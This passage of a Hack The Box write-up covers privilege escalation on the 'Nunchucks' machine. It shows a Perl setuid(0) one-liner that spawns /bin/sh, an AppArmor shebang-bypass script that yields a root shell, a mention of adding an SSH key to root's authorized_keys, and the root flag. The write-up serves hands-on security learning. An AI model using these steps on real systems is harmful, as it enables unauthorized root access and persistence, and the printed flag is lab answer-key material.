+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> find /opt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>type</span> f<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>name</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>*.pl<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">/opt/backup.pl
+</span></code></pre>
+<p>Bingo! It finds lots of them, and one is located in <code>/opt</code>.</p>
+<h2 id="exploring-opt">Exploring <code>/opt</code></h2>
+<p>If we list the content of the <code>/opt</code> folder, we find unusual files owned by <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /opt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x  3 root root 4096 Oct 28  2021 .
+</span><span class="z-text z-plain">drwxr-xr-x 19 root root 4096 Oct 28  2021 ..
+</span><span class="z-text z-plain">-rwxr-xr-x  1 root root  838 Sep  1  2021 backup.pl
+</span><span class="z-text z-plain">drwxr-xr-x  2 root root 4096 Oct 28  2021 web_backups
+</span></code></pre>
+<p>The <code>web_backups</code> folder contains <code>.tar</code> files, probably backups of the web server.</p>
+<p>The <code>backup.pl</code> is a Perl script, it must have generated the <code>.tar</code> files! It looks like this:</p>
+<pre data-lang="pl" class="language-pl z-code"><code class="language-pl" data-lang="pl"><span class="z-source z-perl"><span class="z-meta z-comment z-perl"><span class="z-comment z-line z-number-sign z-perl"><span class="z-punctuation z-definition z-comment z-perl">#</span>!/usr/bin/perl
+</span></span></span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">strict</span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">POSIX</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">qw</span><span class="z-meta z-parens z-perl"><span class="z-punctuation z-section z-parens z-begin z-perl">(</span></span><span class="z-meta z-parens z-perl"><span class="z-meta z-string z-perl"><span class="z-string z-unquoted z-perl">strftime</span></span><span class="z-punctuation z-section z-parens z-end z-perl">)</span></span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">DBI</span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">POSIX</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">qw</span><span class="z-meta z-parens z-perl"><span class="z-punctuation z-section z-parens z-begin z-perl">(</span></span><span class="z-meta z-parens z-perl"><span class="z-meta z-string z-perl"><span class="z-string z-unquoted z-perl">setuid</span></span><span class="z-punctuation z-section z-parens z-end z-perl">)</span></span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span> 
+</span><span class="z-source z-perl"><span class="z-meta z-path z-perl"><span class="z-variable z-namespace z-perl">POSIX</span><span class="z-punctuation z-accessor z-double-colon z-perl">::</span><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">setuid</span></span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-constant z-numeric z-integer z-decimal z-perl">0</span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span> 
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-storage z-type z-variable z-perl">my</span> <span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpdir</span>        <span class="z-keyword z-operator z-assignment z-perl">=</span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>/tmp<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-storage z-type z-variable z-perl">my</span> <span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>backup_main</span> <span class="z-keyword z-operator z-assignment z-perl">=</span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-single z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&#39;</span>/var/www<span class="z-punctuation z-definition z-string z-end z-perl">&#39;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-storage z-type z-variable z-perl">my</span> <span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span> <span class="z-keyword z-operator z-assignment z-perl">=</span> <span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">strftime</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span></span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">%</span>Y</span></span><span class="z-string z-quoted z-double z-perl">-</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">%</span>m</span></span><span class="z-string z-quoted z-double z-perl">-<span class="z-constant z-other z-placeholder z-perl"><span class="z-punctuation z-definition z-placeholder z-perl">%</span>d</span>-<span class="z-constant z-other z-placeholder z-perl"><span class="z-punctuation z-definition z-placeholder z-perl">%</span>s</span><span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-separator z-sequence z-perl">,</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">localtime</span></span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-storage z-type z-variable z-perl">my</span> <span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span> <span class="z-keyword z-operator z-assignment z-perl">=</span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span></span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpdir</span></span><span class="z-string z-quoted z-double z-perl">/backup_</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span></span><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-meta z-function z-perl"><span class="z-storage z-type z-function z-perl"><span class="z-keyword z-declaration z-function z-perl">sub</span></span> <span class="z-entity z-name z-function z-perl">printlog</span>
+</span></span><span class="z-source z-perl"><span class="z-meta z-function z-perl"></span><span class="z-punctuation z-section z-block z-begin z-perl">{</span>
+</span><span class="z-source z-perl">    <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">print</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>[<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-separator z-sequence z-perl">,</span> <span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">strftime</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span><span class="z-constant z-other z-placeholder z-perl"><span class="z-punctuation z-definition z-placeholder z-perl">%</span>D</span> </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">%</span>T</span></span><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-separator z-sequence z-perl">,</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">localtime</span></span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-separator z-sequence z-perl">,</span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>] </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-language z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>_</span><span class="z-meta z-item-access z-perl"><span class="z-punctuation z-section z-item-access z-begin z-perl">[</span><span class="z-constant z-numeric z-integer z-decimal z-perl">0</span><span class="z-punctuation z-section z-item-access z-end z-perl">]</span></span></span><span class="z-string z-quoted z-double z-perl"><span class="z-constant z-character z-escape z-perl">\n</span><span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-punctuation z-section z-block z-end z-perl">}</span>
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-meta z-function z-perl"><span class="z-storage z-type z-function z-perl"><span class="z-keyword z-declaration z-function z-perl">sub</span></span> <span class="z-entity z-name z-function z-perl">archive</span>
+</span></span><span class="z-source z-perl"><span class="z-meta z-function z-perl"></span><span class="z-punctuation z-section z-block z-begin z-perl">{</span>
+</span><span class="z-source z-perl">    <span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Archiving...<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl">    <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">system</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>/usr/bin/tar -zcf </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span></span><span class="z-string z-quoted z-double z-perl">/backup_</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span></span><span class="z-string z-quoted z-double z-perl">.tar </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>backup_main</span></span><span class="z-string z-quoted z-double z-perl">/* 2&gt;/dev/null<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl">    <span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Backup complete in </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span></span><span class="z-string z-quoted z-double z-perl">/backup_</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span></span><span class="z-string z-quoted z-double z-perl">.tar<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-punctuation z-section z-block z-end z-perl">}</span>
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-keyword z-control z-conditional z-if z-perl">if</span> <span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-variable z-language z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>&gt;</span> <span class="z-keyword z-operator z-comparison z-perl">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-perl">0</span><span class="z-punctuation z-section z-group z-end z-perl">)</span> <span class="z-punctuation z-section z-block z-begin z-perl">{</span>
+</span><span class="z-source z-perl">    <span class="z-keyword z-control z-flow z-die z-perl">die</span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>You must run this script as root.<span class="z-constant z-character z-escape z-perl">\n</span><span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-punctuation z-section z-block z-end z-perl">}</span>
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Backup starts.<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">mkdir</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-keyword z-operator z-dereference z-perl">&amp;</span><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">archive</span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Moving </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span></span><span class="z-string z-quoted z-double z-perl">/backup_</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span></span><span class="z-string z-quoted z-double z-perl"> to /opt/web_backups<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">system</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>/usr/bin/mv </span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span></span><span class="z-string z-quoted z-double z-perl">/backup_</span><span class="z-meta z-interpolation z-perl"><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>now</span></span><span class="z-string z-quoted z-double z-perl">.tar /opt/web_backups/<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Removing temporary directory<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">rmdir</span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-variable z-other z-readwrite z-perl"><span class="z-punctuation z-definition z-variable z-perl">$</span>tmpbdir</span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">printlog</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>Completed<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span></code></pre>
+<p>As expected, this script is used to create backups for the web server. It creates a backup folder in <code>/tmp/</code>, creates a <code>.tar</code> file with the name set to the current time in this folder, moves it into <code>/opt/web_backups/</code>, and deletes the temporary backup folder.</p>
+<p>The thing is that only <code>root</code> is allowed to write into <code>/opt/web_backups/</code>, so this script is using <code>POSIX::setuid(0);</code> to execute as <code>root</code>.</p>
+<p>To do this, it must either be SUID or have a capability. We discovered earlier that <code>/usr/bin/perl</code> has capabilities to change its ID, so we should be able to use it to get a shell as <code>root</code>!</p>
+<p>We can use <a href="https://gtfobins.github.io/">GTFOBins</a> for that. It has one entry for <a href="https://gtfobins.github.io/gtfobins/perl/">perl</a>, and it even gives a payload to abuse <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">Capabilities</a>! Let's try it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /usr/bin/perl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<p>And... it doesn't work.</p>
+<p>If we think about it, we found an AppArmor profile for this binary in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/#apparmor">AppArmor</a> section. Let's get its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/apparmor.d/usr.bin.perl</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain"># Last Modified: Tue Aug 31 18:25:30 2021
+</span><span class="z-text z-plain">#include &lt;tunables/global&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">/usr/bin/perl {
+</span><span class="z-text z-plain">  #include &lt;abstractions/base&gt;
+</span><span class="z-text z-plain">  #include &lt;abstractions/nameservice&gt;
+</span><span class="z-text z-plain">  #include &lt;abstractions/perl&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  capability setuid,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  deny owner /etc/nsswitch.conf r,
+</span><span class="z-text z-plain">  deny /root/* rwx,
+</span><span class="z-text z-plain">  deny /etc/shadow rwx,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  /usr/bin/id mrix,
+</span><span class="z-text z-plain">  /usr/bin/ls mrix,
+</span><span class="z-text z-plain">  /usr/bin/cat mrix,
+</span><span class="z-text z-plain">  /usr/bin/whoami mrix,
+</span><span class="z-text z-plain">  /opt/backup.pl mrix,
+</span><span class="z-text z-plain">  owner /home/ r,
+</span><span class="z-text z-plain">  owner /home/david/ r,
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span></code></pre>
+<p>So this AppArmor profile denies read access to <code>/etc/nsswitch.conf</code>, read-write access to files under <code>/root</code>, and read-write access to <code>/etc/shadow</code>. It only allows to run a few binaries, including the script we found in <code>/opt</code>.</p>
+<p>That's problematic... how can we get <code>root</code> if we can set our UID to it, but only by running <code>/opt/backup.pl</code>, which we can't modify?</p>
+<p>I tried to search <a href="https://gtfobins.github.io/">GTFOBins</a> for the binaries that we can execute with <code>/usr/bin/perl</code>, and <code>cat</code> allows to read the content of arbitrary files. The issue is that we need to execute <code>POSIX::setuid(0)</code> to run it as <code>root</code>, and there's no way to do so.</p>
+<h1 id="privilege-escalation-usr-bin-perl-capabilities">Privilege escalation (<code>/usr/bin/perl</code> capabilities)</h1>
+<p>If we search online for ways to bypass this restriction, we find <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass">this HackTricks heading</a>. It mentions <a href="https://bugs.launchpad.net/apparmor/+bug/1911431">a bug</a> that allows to bypass AppArmor profiles policies by adding a shebang at the beginning of a script and executing it directly.</p>
+<p>In our case, this means that we could create a Perl script starting with <code>#!/usr/bin/perl</code> and make it executable. When Linux tries to load the script as executable, the shebang tells it what interpreter to use. But AppArmor treats scripts as their own executables, so the rules for the interpreter don't apply! It would allow us to execute <code>/usr/bin/perl</code> without the AppArmor rules.</p>
+<h2 id="preparation">Preparation</h2>
+<p>Let's put this in practice to get <code>root</code>. First, I'll create a <code>privesc.pl</code> file in <code>/tmp</code>:</p>
+<pre data-lang="pl" class="language-pl z-code"><code class="language-pl" data-lang="pl"><span class="z-source z-perl"><span class="z-meta z-comment z-perl"><span class="z-comment z-line z-number-sign z-perl"><span class="z-punctuation z-definition z-comment z-perl">#</span>!/usr/bin/perl
+</span></span></span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">POSIX</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">qw</span><span class="z-meta z-parens z-perl"><span class="z-punctuation z-section z-parens z-begin z-perl">(</span></span><span class="z-meta z-parens z-perl"><span class="z-meta z-string z-perl"><span class="z-string z-unquoted z-perl">strftime</span></span><span class="z-punctuation z-section z-parens z-end z-perl">)</span></span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-preprocessor z-use z-perl"><span class="z-keyword z-control z-import z-use z-perl">use</span> <span class="z-entity z-name z-namespace z-perl">POSIX</span> <span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">qw</span><span class="z-meta z-parens z-perl"><span class="z-punctuation z-section z-parens z-begin z-perl">(</span></span><span class="z-meta z-parens z-perl"><span class="z-meta z-string z-perl"><span class="z-string z-unquoted z-perl">setuid</span></span><span class="z-punctuation z-section z-parens z-end z-perl">)</span></span></span></span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl"><span class="z-meta z-path z-perl"><span class="z-variable z-namespace z-perl">POSIX</span><span class="z-punctuation z-accessor z-double-colon z-perl">::</span><span class="z-meta z-function-call z-perl"><span class="z-variable z-function z-perl">setuid</span></span></span><span class="z-punctuation z-section z-group z-begin z-perl">(</span><span class="z-constant z-numeric z-integer z-decimal z-perl">0</span><span class="z-punctuation z-section z-group z-end z-perl">)</span><span class="z-punctuation z-terminator z-statement z-perl">;</span>
+</span><span class="z-source z-perl">
+</span><span class="z-source z-perl"><span class="z-meta z-function-call z-perl"><span class="z-support z-function z-perl">exec</span></span> <span class="z-meta z-string z-perl"><span class="z-string z-quoted z-double z-perl"><span class="z-punctuation z-definition z-string z-begin z-perl">&quot;</span>/bin/sh<span class="z-punctuation z-definition z-string z-end z-perl">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll make the script executable.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> chmod +x /tmp/privesc.pl</span>
+</span></code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<p>And finally I'll run it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">david@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> /tmp/privesc.pl</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">#
+</span></code></pre>
+<p>We got a different shell. And if we enter <code>whoami</code>, we see that we are <code>root</code>!</p>
+<p>Just for good measure, I'll add a SSH key to <code>/root/.ssh/authorized_keys</code> and connect using SSH.</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag!</p>
+<p>As usual, we can find it in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@nunchucks:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/root.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4f10f10b6e335a743a641c11200918e8
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/success.png" alt="Success" /></p>
+<p>That's it for this box! The foothold was fairly easy to obtain, although a bit cumbersome to exploit. I ended up writing a script because it was annoying escaping the quotes by hand. I found the privilege escalation harder, because I didn't know about Linux capabilities and AppArmor profiles. It was also hard to find the AppArmor bypass. All in all, I loved this box and I learned a lot thanks to it.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
